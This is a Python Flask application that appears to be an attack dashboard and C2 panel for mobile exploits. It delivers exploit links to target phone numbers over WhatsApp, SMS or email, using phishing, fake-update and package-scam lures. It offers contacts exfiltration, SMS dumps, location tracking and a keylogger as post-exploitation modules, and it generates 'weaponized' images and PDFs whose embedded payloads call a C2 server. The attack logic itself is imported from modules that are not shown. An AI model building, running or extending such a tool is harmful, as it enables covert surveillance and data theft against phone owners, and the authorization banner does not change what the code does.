#!/usr/bin/env python3
"""
Red Team Mobile Attack Dashboard
Enhanced C2 Panel for iOS and Android exploit deployment via WhatsApp/SMS
Integrates mobile_attack_payloads with Infobip WhatsApp delivery
"""

import sys
from pathlib import Path
PROJECT_ROOT = Path(__file__).parent
sys.path.insert(0, str(PROJECT_ROOT))

import os
import json
import logging
from datetime import datetime
from flask import Flask, request, jsonify, render_template_string
from flask_cors import CORS
from dotenv import load_dotenv

# Import custom modules
from modules.mobile_security_testing import MobileSecurityTesting
from modules.mobile_attack_payloads import MobileAttackPayloads
from modules.steganography_injector import SteganographyInjector
from database.models import SessionLocal, AttackSimulation, AuditLog
from werkzeug.utils import secure_filename

load_dotenv()

# Initialize Flask app
app = Flask(__name__)
CORS(app)

# Configure logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler('logs/red_team_mobile_attack.log'),
        logging.StreamHandler()
    ]
)
logger = logging.getLogger(__name__)

# Initialize modules
mobile_tester = MobileSecurityTesting()
attack_payloads = MobileAttackPayloads()
db_session = SessionLocal()

# Enhanced HTML Template for Red Team Mobile Attack Dashboard
RED_TEAM_DASHBOARD_HTML = """
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Red Team Mobile Attack Dashboard - Project Red Sword</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        body {
            font-family: 'Courier New', monospace;
            background: #000000;
            color: #00ff00;
            padding: 20px;
        }
        .header {
            text-align: center;
            border: 3px solid #ff0000;
            padding: 25px;
            margin-bottom: 30px;
            background: linear-gradient(135deg, #1a0000 0%, #0a0a0a 100%);
            box-shadow: 0 0 20px #ff0000;
        }
        .header h1 {
            color: #ff0000;
            text-shadow: 0 0 15px #ff0000, 0 0 30px #ff0000;
            font-size: 2.5em;
            margin-bottom: 10px;
        }
        .header h2 {
            color: #00ff00;
            text-shadow: 0 0 10px #00ff00;
        }
        .container {
            max-width: 1400px;
            margin: 0 auto;
        }
        .section {
            background: linear-gradient(135deg, #0a0a0a 0%, #1a1a1a 100%);
            border: 2px solid #00ff00;
            padding: 25px;
            margin-bottom: 25px;
            box-shadow: 0 0 15px rgba(0, 255, 0, 0.3);
        }
        .section h2 {
            color: #ff0000;
            margin-bottom: 20px;
            border-bottom: 2px solid #ff0000;
            padding-bottom: 10px;
            text-shadow: 0 0 10px #ff0000;
        }
        .form-group {
            margin-bottom: 20px;
        }
        label {
            display: block;
            margin-bottom: 8px;
            color: #00ff00;
            font-weight: bold;
        }
        input, select, textarea {
            width: 100%;
            padding: 12px;
            background: #000000;
            border: 2px solid #00ff00;
            color: #00ff00;
            font-family: 'Courier New', monospace;
            font-size: 14px;
        }
        input:focus, select:focus, textarea:focus {
            outline: none;
            border-color: #ff0000;
            box-shadow: 0 0 10px rgba(255, 0, 0, 0.5);
        }
        button {
            background: #ff0000;
            color: #ffffff;
            border: none;
            padding: 15px 35px;
            cursor: pointer;
            font-family: 'Courier New', monospace;
            font-weight: bold;
            font-size: 16px;
            margin-right: 15px;
            margin-top: 10px;
            transition: all 0.3s;
            text-transform: uppercase;
        }
        button:hover {
            background: #cc0000;
            box-shadow: 0 0 20px #ff0000;
            transform: scale(1.05);
        }
        button.secondary {
            background: #00ff00;
            color: #000000;
        }
        button.secondary:hover {
            background: #00cc00;
            box-shadow: 0 0 20px #00ff00;
        }
        button.warning {
            background: #ff9900;
            color: #000000;
        }
        button.warning:hover {
            background: #cc7700;
            box-shadow: 0 0 20px #ff9900;
        }
        .status {
            padding: 20px;
            margin-top: 20px;
            border: 2px solid #00ff00;
            background: #0a0a0a;
            display: none;
        }
        .status.success {
            border-color: #00ff00;
            color: #00ff00;
            box-shadow: 0 0 15px rgba(0, 255, 0, 0.5);
        }
        .status.error {
            border-color: #ff0000;
            color: #ff0000;
            box-shadow: 0 0 15px rgba(255, 0, 0, 0.5);
        }
        .stats-grid {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(220px, 1fr));
            gap: 20px;
            margin-top: 20px;
        }
        .stat-box {
            background: #000000;
            padding: 20px;
            border: 2px solid #ff0000;
            text-align: center;
            box-shadow: 0 0 15px rgba(255, 0, 0, 0.3);
        }
        .stat-value {
            font-size: 2.5em;
            color: #ff0000;
            font-weight: bold;
            text-shadow: 0 0 10px #ff0000;
        }
        .stat-label {
            color: #00ff00;
            margin-top: 10px;
            font-size: 1.1em;
        }
        .warning-banner {
            background: linear-gradient(135deg, #1a0000 0%, #330000 100%);
            border: 3px solid #ff0000;
            padding: 20px;
            margin-bottom: 25px;
            color: #ff0000;
            text-align: center;
            box-shadow: 0 0 20px rgba(255, 0, 0, 0.5);
        }
        .warning-banner strong {
            font-size: 1.3em;
            text-shadow: 0 0 10px #ff0000;
        }
        .log-output {
            background: #000000;
            border: 2px solid #00ff00;
            padding: 20px;
            height: 300px;
            overflow-y: auto;
            font-family: 'Courier New', monospace;
            font-size: 13px;
        }
        .exploit-card {
            background: #0a0a0a;
            border: 2px solid #ff0000;
            padding: 15px;
            margin-bottom: 15px;
        }
        .exploit-card h3 {
            color: #ff0000;
            margin-bottom: 10px;
        }
        .exploit-card p {
            color: #00ff00;
            margin-bottom: 5px;
        }
        .badge {
            display: inline-block;
            padding: 5px 10px;
            background: #ff0000;
            color: #ffffff;
            margin-right: 5px;
            font-size: 11px;
            font-weight: bold;
        }
        .radio-group {
            display: flex;
            gap: 20px;
            margin-top: 10px;
        }
        .radio-group label {
            display: flex;
            align-items: center;
            gap: 8px;
        }
        .radio-group input[type="radio"] {
            width: auto;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <h1>⚔️ RED TEAM MOBILE ATTACK DASHBOARD ⚔️</h1>
            <h2>iOS & Android Zero-Click Exploit Deployment System</h2>
            <p style="color: #ff9900; margin-top: 10px;">Advanced Threat Simulation | Real-World Attack Vectors</p>
        </div>

        <div class="warning-banner">
            <strong>⚠️ AUTHORIZED RED TEAM OPERATIONS ONLY ⚠️</strong><br>
            This system deploys real-world mobile exploits for authorized security testing.<br>
            All activities are logged, audited, and monitored by Blue Team SOC.<br>
            <strong>UNAUTHORIZED USE IS STRICTLY PROHIBITED</strong>
        </div>

        <!-- Attack Statistics Dashboard -->
        <div class="section">
            <h2>📊 Red Team Attack Statistics</h2>
            <div class="stats-grid" id="stats">
                <div class="stat-box">
                    <div class="stat-value" id="stat-total">-</div>
                    <div class="stat-label">Total Attacks</div>
                </div>
                <div class="stat-box">
                    <div class="stat-value" id="stat-ios">-</div>
                    <div class="stat-label">iOS Exploits</div>
                </div>
                <div class="stat-box">
                    <div class="stat-value" id="stat-android">-</div>
                    <div class="stat-label">Android Exploits</div>
                </div>
                <div class="stat-box">
                    <div class="stat-value" id="stat-success">-</div>
                    <div class="stat-label">Success Rate</div>
                </div>
            </div>
        </div>

        <!-- Mobile Attack Deployment -->
        <div class="section">
            <h2>🎯 Mobile Attack Deployment</h2>
            <form id="attackForm">
                <div class="form-group">
                    <label for="target-phone">Target Phone Number (Must be authorized):</label>
                    <input type="text" id="target-phone" placeholder="+1234567890" required>
                    <small style="color: #ff9900; display: block; margin-top: 5px;">⚠️ Only authorized targets can be attacked</small>
                </div>

                <div class="form-group">
                    <label>Target Device Platform:</label>
                    <div class="radio-group">
                        <label>
                            <input type="radio" name="platform" value="auto" checked>
                            <span>🤖 Auto-Detect (Stealth Mode)</span>
                        </label>
                        <label>
                            <input type="radio" name="platform" value="ios">
                            <span>🍎 iOS (Manual)</span>
                        </label>
                        <label>
                            <input type="radio" name="platform" value="android">
                            <span>🤖 Android (Manual)</span>
                        </label>
                    </div>
                </div>

                <div class="form-group">
                    <label for="attack-vector">Attack Vector:</label>
                    <select id="attack-vector">
                        <option value="zero_click">Zero-Click Exploit (No User Interaction)</option>
                        <option value="phishing">Phishing (Social Engineering)</option>
                        <option value="update">Fake System Update</option>
                        <option value="package">Package Delivery Scam</option>
                    </select>
                </div>

                <div class="form-group">
                    <label for="delivery-method">Delivery Method:</label>
                    <select id="delivery-method">
                        <option value="whatsapp">📱 WhatsApp (Infobip - Recommended)</option>
                        <option value="sms">💬 SMS (Infobip/TextBelt)</option>
                        <option value="email">📧 Email (SendGrid)</option>
                    </select>
                </div>

                <div class="form-group">
                    <label for="post-exploit">Post-Exploitation Modules:</label>
                    <select id="post-exploit" multiple size="6">
                        <option value="contacts" selected>📇 Contacts Exfiltration</option>
                        <option value="sms" selected>💬 SMS Dump</option>
                        <option value="location" selected>📍 Location Tracking</option>
                        <option value="keylogger" selected>⌨️ Keylogger (Capture Keystrokes)</option>
                        <option value="photos">📸 Photos Metadata</option>
                        <option value="call_logs">📞 Call Logs</option>
                    </select>
                    <small style="color: #00ff00; display: block; margin-top: 5px;">Hold Ctrl/Cmd to select multiple</small>
                </div>

                <button type="submit">🚀 DEPLOY ATTACK</button>
                <button type="button" class="warning" onclick="simulateAttack()">⚡ SIMULATE (Demo Mode)</button>
                <button type="button" class="secondary" onclick="clearForm('attackForm')">Clear</button>
            </form>
            <div class="status" id="attack-status"></div>
        </div>

        <!-- Available Exploits -->
        <div class="section">
            <h2>💀 Available Mobile Exploits</h2>
            <div class="exploit-card">
                <h3>🍎 iOS WebKit Zero-Click Exploit</h3>
                <p><span class="badge">CVE-2021-30860</span><span class="badge">ZERO-CLICK</span><span class="badge">REMOTE CODE EXECUTION</span></p>
                <p><strong>Description:</strong> Exploits WebKit rendering engine vulnerability to achieve remote code execution without user interaction.</p>
                <p><strong>Post-Exploit:</strong> Contacts, SMS, Location, Photos, Keylogger</p>
            </div>
            <div class="exploit-card">
                <h3>🤖 Android Bluetooth Zero-Click Exploit</h3>
                <p><span class="badge">CVE-2023-45866</span><span class="badge">ZERO-CLICK</span><span class="badge">BLUEDROID RCE</span></p>
                <p><strong>Description:</strong> Exploits Bluetooth stack vulnerability (BlueDroid) for remote code execution via proximity attack.</p>
                <p><strong>Post-Exploit:</strong> SMS Dump, Contacts, Call Logs, Keylogger, Location, Photos</p>
            </div>
        </div>

        <!-- Steganography Payload Generator -->
        <div class="section">
            <h2>🖼️ Steganography Payload Generator</h2>
            <p style="color: #ff9900;">Embed zero-click exploits into images or PDFs for covert delivery via social media</p>

            <form id="stegoForm" enctype="multipart/form-data">
                <div class="form-grid">
                    <div class="form-group">
                        <label for="stego-file">Upload Cover Image/PDF:</label>
                        <input type="file" id="stego-file" name="file" accept="image/*,.pdf" required>
                        <small style="color: #00ff00; display: block; margin-top: 5px;">Supported: PNG, JPG, BMP, PDF</small>
                    </div>

                    <div class="form-group">
                        <label for="stego-platform">Target Platform:</label>
                        <select id="stego-platform">
                            <option value="auto">Auto-Detect Device</option>
                            <option value="ios">iOS (WebKit Exploit)</option>
                            <option value="android">Android (Bluetooth Exploit)</option>
                        </select>
                    </div>
                </div>

                <div class="form-grid">
                    <div class="form-group">
                        <label for="stego-vector">Exploit Type:</label>
                        <select id="stego-vector">
                            <option value="zero_click">Zero-Click Exploit</option>
                            <option value="phishing">Phishing Vector</option>
                            <option value="update">Fake System Update</option>
                        </select>
                    </div>

                    <div class="form-group">
                        <label for="stego-c2">C2 Callback URL:</label>
                        <input type="text" id="stego-c2" value="http://localhost:4000" readonly>
                    </div>
                </div>

                <button type="submit">🎨 Generate Steganographic Payload</button>
                <button type="button" class="secondary" onclick="clearForm('stegoForm')">Clear</button>
            </form>

            <div class="info-box" style="margin-top: 20px; display: none;" id="stego-result">
                <h3 style="color: #00ff00;">✅ Steganographic Payload Generated</h3>
                <p><strong>Output File:</strong> <span id="stego-output-file"></span></p>
                <p><strong>Embedded Payload:</strong> <span id="stego-payload-type"></span></p>
                <p><strong>File Size:</strong> <span id="stego-file-size"></span></p>
                <button onclick="downloadStegoFile()">⬇️ Download Weaponized File</button>
                <button class="warning" onclick="previewStegoFile()">👁️ Preview</button>
            </div>

            <div class="info-box" style="background: rgba(255, 153, 0, 0.1); border-color: #ff9900; margin-top: 15px;">
                <strong>ℹ️ Usage Instructions:</strong>
                <ol style="margin-left: 20px; margin-top: 10px;">
                    <li>Upload an innocent-looking image or PDF</li>
                    <li>Select target platform (or use auto-detect)</li>
                    <li>Generate steganographic payload</li>
                    <li>Download weaponized file</li>
                    <li>Share via social media, email, or messaging apps</li>
                    <li>When target opens/views file, exploit auto-deploys</li>
                    <li>Monitor C2 server for incoming connections</li>
                </ol>
            </div>
        </div>

        <!-- Activity Log -->
        <div class="section">
            <h2>📝 Red Team Activity Log</h2>
            <div class="log-output" id="log-output">
                <div style="color: #ff0000;">[System] Red Team Mobile Attack Dashboard initialized</div>
                <div style="color: #ff9900;">[System] C2 Server: zeroclickexploits.ddns.net</div>
                <div style="color: #00ff00;">[System] Waiting for Red Team operator commands...</div>
            </div>
        </div>
    </div>

    <script>
        // Load statistics on page load
        window.addEventListener('load', loadStatistics);
        setInterval(loadStatistics, 15000);  // Refresh every 15 seconds

        function loadStatistics() {
            fetch('/api/attack_stats')
                .then(response => response.json())
                .then(data => {
                    document.getElementById('stat-total').textContent = data.total_attacks || 0;
                    document.getElementById('stat-ios').textContent = data.ios_attacks || 0;
                    document.getElementById('stat-android').textContent = data.android_attacks || 0;
                    document.getElementById('stat-success').textContent = (data.success_rate || 0).toFixed(1) + '%';
                })
                .catch(error => console.error('Error loading stats:', error));
        }

        function logActivity(message, type = 'info') {
            const logOutput = document.getElementById('log-output');
            const timestamp = new Date().toLocaleTimeString();
            const colors = {
                'error': '#ff0000',
                'success': '#00ff00',
                'warning': '#ff9900',
                'info': '#00ffff'
            };
            const entry = document.createElement('div');
            entry.style.color = colors[type] || colors['info'];
            entry.textContent = `[${timestamp}] ${message}`;
            logOutput.appendChild(entry);
            logOutput.scrollTop = logOutput.scrollHeight;
        }

        function showStatus(elementId, message, isSuccess) {
            const status = document.getElementById(elementId);
            status.innerHTML = message;
            status.className = 'status ' + (isSuccess ? 'success' : 'error');
            status.style.display = 'block';
            setTimeout(() => {
                status.style.display = 'none';
            }, 8000);
        }

        function clearForm(formId) {
            document.getElementById(formId).reset();
        }

        function simulateAttack() {
            logActivity('⚡ SIMULATION MODE ACTIVATED', 'warning');
            const target = document.getElementById('target-phone').value || '+1234567890';
            const platform = document.querySelector('input[name="platform"]:checked').value;

            logActivity(`🎯 Simulating attack on ${target}`, 'info');
            logActivity(`🔍 Platform detection: ${platform}`, 'info');
            logActivity(`📱 Payload generated: WebKit/Bluetooth exploit`, 'success');
            logActivity(`📡 C2 callback established (simulated)`, 'success');
            logActivity(`💀 Post-exploitation modules ready (simulated)`, 'success');

            showStatus('attack-status', '✅ SIMULATION COMPLETE - Attack would be deployed in production mode', true);
        }

        // Attack Form Handler
        document.getElementById('attackForm').addEventListener('submit', function(e) {
            e.preventDefault();

            const target = document.getElementById('target-phone').value;
            const platform = document.querySelector('input[name="platform"]:checked').value;
            const attackVector = document.getElementById('attack-vector').value;
            const deliveryMethod = document.getElementById('delivery-method').value;
            const postExploit = Array.from(document.getElementById('post-exploit').selectedOptions).map(opt => opt.value);

            logActivity(`🎯 Initiating mobile attack: Target=${target}, Platform=${platform}`, 'warning');

            fetch('/api/deploy_attack', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    target: target,
                    platform: platform,
                    attack_vector: attackVector,
                    delivery_method: deliveryMethod,
                    post_exploit_modules: postExploit
                })
            })
            .then(response => response.json())
            .then(data => {
                if (data.success) {
                    const demoTag = data.demo_mode ? ' [DEMO MODE]' : ' [LIVE ATTACK]';
                    showStatus('attack-status', `✅ ATTACK DEPLOYED SUCCESSFULLY${demoTag}<br>` +
                        `Exploit: ${data.exploit_type || 'N/A'}<br>` +
                        `Platform: ${data.platform || 'N/A'}<br>` +
                        `CVE: ${data.cve || 'N/A'}<br>` +
                        `C2 Callback: ${data.c2_callback || 'N/A'}`, true);

                    logActivity(`✅ Attack deployed to ${target}${demoTag}`, 'success');
                    logActivity(`📡 C2 callback: ${data.c2_callback}`, 'success');

                    if (data.post_exploitation) {
                        logActivity(`💀 Post-exploit modules: ${data.post_exploitation.modules_executed.join(', ')}`, 'success');
                    }

                    loadStatistics();
                } else {
                    showStatus('attack-status', `❌ ATTACK FAILED: ${data.error}`, false);
                    logActivity(`❌ Attack failed: ${data.error}`, 'error');
                }
            })
            .catch(error => {
                showStatus('attack-status', `❌ ERROR: ${error}`, false);
                logActivity(`❌ System error: ${error}`, 'error');
            });
        });

        // Steganography Form Handler
        let currentStegoFile = null;

        document.getElementById('stegoForm').addEventListener('submit', function(e) {
            e.preventDefault();

            const formData = new FormData();
            const fileInput = document.getElementById('stego-file');
            const file = fileInput.files[0];

            if (!file) {
                showStatus('attack-status', '❌ Please select a file', false);
                return;
            }

            formData.append('file', file);
            formData.append('platform', document.getElementById('stego-platform').value);
            formData.append('exploit_type', document.getElementById('stego-vector').value);
            formData.append('c2_server', document.getElementById('stego-c2').value);

            logActivity(`🎨 Generating steganographic payload: ${file.name}`, 'warning');

            fetch('/api/generate_stego_payload', {
                method: 'POST',
                body: formData
            })
            .then(response => response.json())
            .then(data => {
                if (data.success) {
                    logActivity(`✅ Steganographic payload generated successfully`, 'success');
                    logActivity(`📁 Output file: ${data.output_filename}`, 'info');
                    logActivity(`💀 Embedded exploit: ${data.exploit_type} for ${data.platform}`, 'info');

                    // Show result box
                    document.getElementById('stego-result').style.display = 'block';
                    document.getElementById('stego-output-file').textContent = data.output_filename;
                    document.getElementById('stego-payload-type').textContent = `${data.exploit_type} (${data.platform})`;
                    document.getElementById('stego-file-size').textContent = data.file_size;

                    // Store file URL for download
                    currentStegoFile = data.download_url;

                    showStatus('attack-status', '✅ Steganographic payload ready for deployment', true);
                } else {
                    showStatus('attack-status', `❌ Steganography failed: ${data.error}`, false);
                    logActivity(`❌ Steganography error: ${data.error}`, 'error');
                }
            })
            .catch(error => {
                showStatus('attack-status', `❌ ERROR: ${error}`, false);
                logActivity(`❌ System error: ${error}`, 'error');
            });
        });

        function downloadStegoFile() {
            if (currentStegoFile) {
                window.location.href = currentStegoFile;
                logActivity('⬇️ Downloading weaponized file', 'success');
            } else {
                logActivity('❌ No file available for download', 'error');
            }
        }

        function previewStegoFile() {
            if (currentStegoFile) {
                window.open(currentStegoFile, '_blank');
                logActivity('👁️ Previewing weaponized file', 'info');
            } else {
                logActivity('❌ No file available for preview', 'error');
            }
        }
    </script>
</body>
</html>
"""


# API Routes
@app.route('/')
def index():
    """Main Red Team attack dashboard"""
    return render_template_string(RED_TEAM_DASHBOARD_HTML)


@app.route('/api/attack_stats', methods=['GET'])
def get_attack_statistics():
    """Get Red Team attack statistics"""
    try:
        from sqlalchemy import func

        total_attacks = db_session.query(func.count(AttackSimulation.id)).filter(
            AttackSimulation.attack_type.like('mobile_%')
        ).scalar() or 0

        ios_attacks = db_session.query(func.count(AttackSimulation.id)).filter(
            AttackSimulation.attack_type.like('%ios%')
        ).scalar() or 0

        android_attacks = db_session.query(func.count(AttackSimulation.id)).filter(
            AttackSimulation.attack_type.like('%android%')
        ).scalar() or 0

        successful = db_session.query(func.count(AttackSimulation.id)).filter(
            AttackSimulation.attack_type.like('mobile_%'),
            AttackSimulation.status == 'SUCCESS'
        ).scalar() or 0

        success_rate = (successful / total_attacks * 100) if total_attacks > 0 else 0

        return jsonify({
            'total_attacks': total_attacks,
            'ios_attacks': ios_attacks,
            'android_attacks': android_attacks,
            'success_rate': success_rate,
            'successful_attacks': successful
        })

    except Exception as e:
        logger.error(f"Error getting attack statistics: {e}")
        return jsonify({
            'total_attacks': 0,
            'ios_attacks': 0,
            'android_attacks': 0,
            'success_rate': 0
        })


@app.route('/api/deploy_attack', methods=['POST'])
def deploy_mobile_attack():
    """
    Deploy mobile attack with integrated exploit payloads
    Delivers via WhatsApp/SMS using Infobip
    """
    try:
        data = request.get_json()
        target = data.get('target')
        platform = data.get('platform', 'auto')
        attack_vector = data.get('attack_vector', 'zero_click')
        delivery_method = data.get('delivery_method', 'whatsapp')
        post_exploit_modules = data.get('post_exploit_modules', ['contacts', 'sms'])

        logger.info(f"[RED TEAM ATTACK] Target: {target} | Platform: {platform} | Vector: {attack_vector}")

        # Validate target authorization
        if not mobile_tester.validate_target_authorization(target, 'phone'):
            return jsonify({
                'success': False,
                'error': 'Target not authorized for attack simulation'
            }), 403

        # Deploy attack payload
        attack_result = attack_payloads.deploy_mobile_attack(
            target=target,
            platform=platform,
            attack_type=attack_vector
        )

        if not attack_result.get('success'):
            return jsonify(attack_result)

        # Generate attack message
        detected_platform = attack_result.get('exploit_type', 'ios').replace('_webkit', '').replace('_bluetooth', '')
        if 'ios' in detected_platform:
            detected_platform = 'ios'
        elif 'android' in detected_platform:
            detected_platform = 'android'

        message_content = attack_payloads.generate_attack_message(detected_platform, attack_vector)

        # Deliver exploit via selected method
        delivery_result = None

        if delivery_method == 'whatsapp':
            # Use Infobip WhatsApp
            exploit_link = f"http://{attack_payloads.c2_server}/exploit/{attack_result.get('target')}"
            message_body = message_content['body'].replace('[EXPLOIT_LINK]', exploit_link)

            delivery_result = mobile_tester.send_whatsapp_test(
                phone_number=target,
                message=message_body,
                test_name=f"red_team_attack_{attack_vector}"
            )

        elif delivery_method == 'sms':
            # Use Infobip SMS
            exploit_link = f"http://{attack_payloads.c2_server}/exploit/{attack_result.get('target')}"
            message_body = message_content['body'].replace('[EXPLOIT_LINK]', exploit_link)

            delivery_result = mobile_tester.send_sms_test(
                phone_number=target,
                message=message_body,
                test_name=f"red_team_attack_{attack_vector}"
            )

        elif delivery_method == 'email':
            # Use SendGrid Email
            exploit_link = f"http://{attack_payloads.c2_server}/exploit/{attack_result.get('target')}"
            message_body = message_content['body'].replace('[EXPLOIT_LINK]', exploit_link)

            delivery_result = mobile_tester.send_email_test(
                email_address=target,  # Assuming target can be email
                subject=message_content['subject'],
                message=message_body,
                test_name=f"red_team_attack_{attack_vector}"
            )

        # Log attack to database
        mobile_tester.log_test_activity(
            test_type=f"red_team_{detected_platform}_{attack_vector}",
            target=target,
            status='SUCCESS' if delivery_result and delivery_result.get('success') else 'FAILED',
            details={
                'platform': detected_platform,
                'attack_vector': attack_vector,
                'delivery_method': delivery_method,
                'exploit_type': attack_result.get('exploit_type'),
                'cve': attack_result.get('cve'),
                'c2_callback': attack_result.get('c2_callback'),
                'post_exploit_modules': post_exploit_modules,
                'demo_mode': attack_result.get('demo_mode', False)
            }
        )

        # Combine results
        combined_result = {
            'success': True,
            'target': target,
            'platform': detected_platform,
            'exploit_type': attack_result.get('exploit_type'),
            'cve': attack_result.get('cve'),
            'c2_callback': attack_result.get('c2_callback'),
            'delivery_method': delivery_method,
            'delivery_status': delivery_result,
            'post_exploitation': attack_result.get('post_exploitation'),
            'demo_mode': attack_result.get('demo_mode', False),
            'timestamp': datetime.utcnow().isoformat()
        }

        return jsonify(combined_result)

    except Exception as e:
        logger.error(f"Error deploying mobile attack: {e}")
        return jsonify({
            'success': False,
            'error': str(e)
        }), 500


@app.route('/api/generate_stego_payload', methods=['POST'])
def generate_stego_payload():
    """
    Generate steganographic payload by embedding exploit into image/PDF
    """
    try:
        # Check if file was uploaded
        if 'file' not in request.files:
            return jsonify({'success': False, 'error': 'No file uploaded'}), 400

        file = request.files['file']
        if file.filename == '':
            return jsonify({'success': False, 'error': 'No file selected'}), 400

        # Get form parameters
        platform = request.form.get('platform', 'auto')
        exploit_type = request.form.get('exploit_type', 'zero_click')
        c2_server = request.form.get('c2_server', 'http://localhost:4000')

        # Secure filename
        filename = secure_filename(file.filename)
        upload_dir = Path('uploads')
        upload_dir.mkdir(exist_ok=True)

        input_path = upload_dir / filename
        file.save(str(input_path))

        logger.info(f"[STEGO] Processing file: {filename}")
        logger.info(f"[STEGO] Platform: {platform}, Exploit: {exploit_type}")

        # Generate the mobile exploit payload
        if platform == 'auto':
            # Auto-detect will be handled when the exploit is triggered
            payload_data = {
                'platform': 'auto',
                'exploit_type': exploit_type,
                'c2_server': c2_server,
                'auto_detect': True
            }
        elif platform == 'ios':
            payload_result = attack_payloads.ios_webkit_exploit(
                target_device_id='stego_target',
                callback_url=f"{c2_server}/ios_callback"
            )
            payload_data = payload_result
        elif platform == 'android':
            payload_result = attack_payloads.android_bluetooth_exploit(
                target_device_id='stego_target'
            )
            payload_data = payload_result
        else:
            return jsonify({'success': False, 'error': 'Invalid platform'}), 400

        # Convert payload to JSON string
        payload_json = json.dumps(payload_data)

        # Initialize steganography module
        stego = SteganographyInjector()

        # Generate output filename
        output_filename = f"weaponized_{filename}"
        output_dir = Path('static/stego_outputs')
        output_dir.mkdir(parents=True, exist_ok=True)
        output_path = output_dir / output_filename

        # Embed payload into image
        result = stego.embed_payload_in_image(
            image_path=str(input_path),
            payload=payload_json,
            output_path=str(output_path)
        )

        if result.get('success'):
            # Get file size
            file_size_bytes = output_path.stat().st_size
            file_size = f"{file_size_bytes / 1024:.2f} KB"

            logger.info(f"[STEGO] Successfully embedded payload into {output_filename}")

            # Log to database
            mobile_tester.log_test_activity(
                test_type='steganography_payload_generation',
                target='social_media_distribution',
                status='SUCCESS',
                details={
                    'original_file': filename,
                    'output_file': output_filename,
                    'platform': platform,
                    'exploit_type': exploit_type,
                    'file_size': file_size,
                    'payload_embedded': True
                }
            )

            return jsonify({
                'success': True,
                'output_filename': output_filename,
                'download_url': f'/static/stego_outputs/{output_filename}',
                'file_size': file_size,
                'platform': platform,
                'exploit_type': exploit_type,
                'c2_server': c2_server,
                'message': 'Steganographic payload generated successfully'
            })
        else:
            return jsonify({
                'success': False,
                'error': result.get('error', 'Steganography embedding failed')
            }), 500

    except Exception as e:
        logger.error(f"[STEGO ERROR] {e}")
        return jsonify({
            'success': False,
            'error': str(e)
        }), 500


@app.route('/api/health', methods=['GET'])
def health_check():
    """Health check endpoint"""
    return jsonify({
        'status': 'operational',
        'timestamp': datetime.utcnow().isoformat(),
        'demo_mode': attack_payloads.demo_mode,
        'c2_server': attack_payloads.c2_server,
        'whatsapp_enabled': mobile_tester.infobip_whatsapp_enabled
    })


if __name__ == '__main__':
    logger.info("="*80)
    logger.info("RED TEAM MOBILE ATTACK DASHBOARD STARTING")
    logger.info("="*80)
    logger.info(f"Demo Mode: {attack_payloads.demo_mode}")
    logger.info(f"C2 Server: {attack_payloads.c2_server}")
    logger.info(f"WhatsApp Delivery: {'Enabled' if mobile_tester.infobip_whatsapp_enabled else 'Disabled'}")
    logger.info(f"Authorized Targets: {len(mobile_tester.authorized_targets)}")
    logger.info("Access Red Team dashboard at: http://localhost:5008")
    logger.info("="*80)

    app.run(
        host='0.0.0.0',
        port=5008,
        debug=False
    )
